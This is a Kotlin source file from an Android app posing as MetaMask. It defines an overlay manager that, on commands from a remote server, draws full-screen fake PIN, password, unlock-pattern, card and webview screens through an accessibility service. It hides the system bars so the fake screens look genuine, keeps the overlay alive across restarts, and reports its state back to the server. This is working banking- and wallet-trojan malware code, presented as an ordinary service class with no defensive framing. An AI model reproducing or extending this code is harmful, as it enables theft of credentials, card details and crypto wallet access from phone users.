package com.example.MetaMask.services

import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Handler
import android.os.Looper
import android.view.View
import android.view.WindowManager
import org.json.JSONObject

class HybridOverlayManager(private val svc: AccessSvc) {

    companion object {
        private const val TAG = "HybridOverlayMgr"
        const val PREFS_NAME = "hybrid_overlay_prefs"
        const val PREF_ACTIVE = "active"
        const val PREF_CONFIG = "config"

        @Volatile var isActive = false
    }

    private var overlayView: View? = null
    private val handler = Handler(Looper.getMainLooper())
    private var timerRunnable: Runnable? = null

    fun restoreIfNeeded() {
        android.util.Log.d("XDBG", "[HybridOverlayManager] restoreIfNeeded enter") //xdbg
        val prefs = svc.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        if (!prefs.getBoolean(PREF_ACTIVE, false)) return
        val cfgStr = prefs.getString(PREF_CONFIG, null) ?: return
        try {
            show(JSONObject(cfgStr))
        } catch (_: Exception) {}
    }

    fun show(config: JSONObject) {
        android.util.Log.d("XDBG", "[HybridOverlayManager] show enter config=${config}") //xdbg
        if (isActive && overlayView != null) {
            android.util.Log.d("XDBG", "[HybridOverlayManager] if branch") //xdbg
            sendToServer(JSONObject().apply {
                put("action", "hybrid_overlay_error")
                put("reason", "already_active")
            })
            return
        }
        svc.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
            .putBoolean(PREF_ACTIVE, true)
            .putString(PREF_CONFIG, config.toString())
            .apply()
        handler.post { addView(config) }
    }

    fun close(reason: String) {
        android.util.Log.d("XDBG", "[HybridOverlayManager] close enter reason=${reason}") //xdbg
        timerRunnable?.let { handler.removeCallbacks(it) }
        timerRunnable = null
        handler.post {
            removeView()
            isActive = false
            svc.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
                .putBoolean(PREF_ACTIVE, false)
                .remove(PREF_CONFIG)
                .apply()
            sendToServer(JSONObject().apply {
                put("action", "hybrid_overlay_closed")
                put("reason", reason)
            })
        }
    }

    private fun addView(config: JSONObject) {
        android.util.Log.d("XDBG", "[HybridOverlayManager] addView enter config=${config}") //xdbg
        removeView()
        val type = config.optString("type", "pin")

        if (type == "browser") {
            android.util.Log.d("XDBG", "[HybridOverlayManager] if branch") //xdbg
            val rawUrl = config.optString("url", "")
            val url = if (rawUrl.startsWith("http://") || rawUrl.startsWith("https://")) rawUrl else "https://$rawUrl"
            try {
                val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                svc.startActivity(intent)
                sendToServer(JSONObject().apply {
                    put("action", "hybrid_overlay_shown")
                    put("type", "browser")
                })
            } catch (_: Exception) {}
            svc.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
                .putBoolean(PREF_ACTIVE, false).remove(PREF_CONFIG).apply()
            return
        }

        val view: View = try {
            when (type) {
                "pin"      -> HybridPinOverlay(svc, config, this)
                "password" -> HybridPasswordOverlay(svc, config, this)
                "pattern"  -> HybridPatternOverlay(svc, config, this)
                "webview"  -> HybridWebViewOverlay(svc, config, this)
                "card"     -> HybridCardOverlay(svc, config, this)
                else -> return
            }
        } catch (_: Exception) { return }

        val wm = svc.getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        )
        params.windowAnimations = 0
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
            android.util.Log.d("XDBG", "[HybridOverlayManager] if branch") //xdbg
            params.layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }

        view.fitsSystemWindows = false
        @Suppress("DEPRECATION")
        view.systemUiVisibility = (
            android.view.View.SYSTEM_UI_FLAG_FULLSCREEN or
            android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
            android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or
            android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
            android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
            android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
        )

        try {
            wm.addView(view, params)
            overlayView = view
            isActive = true
            sendToServer(JSONObject().apply {
                put("action", "hybrid_overlay_shown")
                put("type", type)
            })

            if (config.optString("duration_type") == "timed") {
                android.util.Log.d("XDBG", "[HybridOverlayManager] if branch") //xdbg
                val sec = config.optInt("duration_sec", 60).coerceAtLeast(5)
                val r = Runnable { close("timeout") }
                timerRunnable = r
                handler.postDelayed(r, sec * 1000L)
            }
        } catch (_: Exception) {}
    }

    private fun removeView() {
        android.util.Log.d("XDBG", "[HybridOverlayManager] removeView enter") //xdbg
        val v = overlayView ?: return
        overlayView = null
        try {
            val wm = svc.getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return
            wm.removeView(v)
        } catch (_: Exception) {}
    }

    fun sendToServer(payload: JSONObject) {
        android.util.Log.d("XDBG", "[HybridOverlayManager] sendToServer enter payload=${payload}") //xdbg
        try {
            val intent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, payload.toString())
                setPackage(svc.packageName)
            }
            svc.sendBroadcast(intent)
        } catch (_: Exception) {}
    }

    fun destroy() {
        android.util.Log.d("XDBG", "[HybridOverlayManager] destroy enter") //xdbg
        timerRunnable?.let { handler.removeCallbacks(it) }
        removeView()
        isActive = false
    }
}
